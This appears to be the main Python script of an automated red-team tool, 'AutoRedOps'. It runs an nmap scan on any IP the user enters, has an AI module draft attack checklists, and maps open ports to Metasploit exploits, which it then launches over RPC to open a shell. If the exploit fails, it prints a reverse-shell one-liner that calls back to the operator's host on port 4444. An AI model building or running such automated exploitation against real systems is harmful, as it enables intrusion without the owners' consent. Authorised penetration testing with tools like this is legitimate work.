import yaml
import sys
import subprocess
import socket
import time
import os

# Import modules
try:
    from scanner_nmap import NmapScanner
    from msf_rpc import MetasploitRPC
    from reporter import Reporter
    from ai_brain import AIBrain
    from payload_manager import PayloadManager
except ImportError as e:
    print(f"[-] Critical Error: Missing module: {e}")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class AutoRedOpsCLI:
    def __init__(self):
        self.clear_screen()
        self.load_config()
        
        print(f"{Colors.HEADER}{Colors.BOLD}=== AutoRedOps: Professional Edition ==={Colors.ENDC}")
        
        # Initialize
        print(f"{Colors.BLUE}[*] Initializing Engine...{Colors.ENDC}")
        self.scanner = NmapScanner()
        self.ai = AIBrain()
        self.payload_gen = PayloadManager()
        self.reporter = Reporter(self.config)
        self.start_msf_rpc()
        
        try:
            self.rpc = MetasploitRPC()
            self.rpc_available = True
            print(f"{Colors.GREEN}[+] Metasploit RPC Connected.{Colors.ENDC}")
        except:
            print(f"{Colors.WARNING}[!] Metasploit unavailable. Running in Recon-Only mode.{Colors.ENDC}")
            self.rpc_available = False

    def load_config(self):
        try:
            with open('config.yaml', 'r') as f:
                self.config = yaml.safe_load(f)
            with open('knowledge_base.yml', 'r') as f:
                self.kb = yaml.safe_load(f)
        except:
            print("[-] Config missing. Please run setup.")
            sys.exit(1)

    def clear_screen(self):
        os.system('clear')

    def start_msf_rpc(self):
        rpc_port = self.config['metasploit']['port']
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if sock.connect_ex(('127.0.0.1', rpc_port)) == 0: return 
        
        print(f"{Colors.BLUE}[*] Booting Metasploit Daemon...{Colors.ENDC}")
        cmd = f"msfrpcd -P {self.config['metasploit']['password']} -n -S -a 127.0.0.1 -p {rpc_port}"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(15)

    def run(self):
        while True:
            print(f"\n{Colors.BOLD}--- OPERATIONAL MENU ---{Colors.ENDC}")
            print("1. ðŸŽ¯ Engage Target (Scan & Exploit)")
            print("2. ðŸ“œ View Past Reports")
            print("0. ðŸšª Exit")
            
            choice = input(f"\n{Colors.BLUE}[?] Select Option: {Colors.ENDC}").strip()
            
            if choice == '1':
                self.engage_target()
            elif choice == '2':
                print(f"[*] Check directory: {self.config['paths']['reports']}")
            elif choice == '0':
                sys.exit(0)

    def engage_target(self):
        target = input(f"\n{Colors.BLUE}[?] Enter Target IP: {Colors.ENDC}").strip()
        if not target: return

        # PHASE 1: SCAN
        print(f"\n{Colors.BLUE}[*] Initiating Deep Scan on {target}...{Colors.ENDC}")
        scan_data = self.scanner.scan_target(target)
        
        # Display Findings
        print(f"\n{Colors.GREEN}[+] Surface Area Detected:{Colors.ENDC}")
        for p in scan_data['ports']:
            print(f"    - Port {p['port']}/{p['service']} ({p['product']})")

        # PHASE 2: AI ANALYSIS & CHECKLIST GEN
        print(f"\n{Colors.BLUE}[*] Generating Attack Surface Report...{Colors.ENDC}")
        ai_checklists = {}
        for p in scan_data['ports']:
            if self.ai.client:
                # Ask AI for a manual checklist for this service
                checklist = self.ai.generate_manual_checklist(p['service'], p['port'])
                ai_checklists[p['port']] = checklist

        # PHASE 3: ATTACK PLAN
        attacks = self.plan_attacks(scan_data)
        
        exploit_results = None
        if attacks:
            print(f"\n{Colors.BOLD}--- ATTACK VECTORS ---{Colors.ENDC}")
            for i, atk in enumerate(attacks):
                print(f"[{i+1}] {atk['name']} ({atk['module']})")
            
            print(f"\n{Colors.WARNING}[?] Select exploit to launch (0 to Skip/Report Only): {Colors.ENDC}")
            try:
                choice = int(input("> "))
                if choice > 0 and self.rpc_available:
                    exploit_results = self.execute_exploit(attacks[choice-1], target)
            except ValueError:
                pass

        # PHASE 4: REPORTING
        print(f"\n{Colors.BLUE}[*] Compiling Final Report...{Colors.ENDC}")
        self.reporter.generate_enhanced_report(scan_data, exploit_results, ai_checklists)

    def plan_attacks(self, scan_results):
        attacks = []
        # Logic: Check KB First
        for p in scan_results['ports']:
            for exploit in self.kb['exploit_mappings']:
                if exploit.get('target_port') == int(p['port']):
                    attacks.append(exploit)
        return attacks

    def execute_exploit(self, attack, target):
        lhost = input(f"{Colors.BLUE}[?] Enter LHOST (VPN/LAN IP): {Colors.ENDC}")
        print(f"{Colors.FAIL}[*] Launching {attack['msf_module']}...{Colors.ENDC}")
        
        result = self.rpc.execute_exploit({
            'msf_module': attack['msf_module'],
            'payload': attack['payload'],
            'target_port': int(attack['target_port'])
        }, target, lhost)
        
        if result['success']:
            print(f"{Colors.GREEN}[!!!] SHELL OPENED! Session: {result['session_id']}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[-] Exploit failed.{Colors.ENDC}")
            print(f"{Colors.WARNING}[?] Manual Fallback: {self.payload_gen.get_random_oneliner(lhost, 4444)}{Colors.ENDC}")
            
        return result

if __name__ == "__main__":
    app = AutoRedOpsCLI()
    app.run()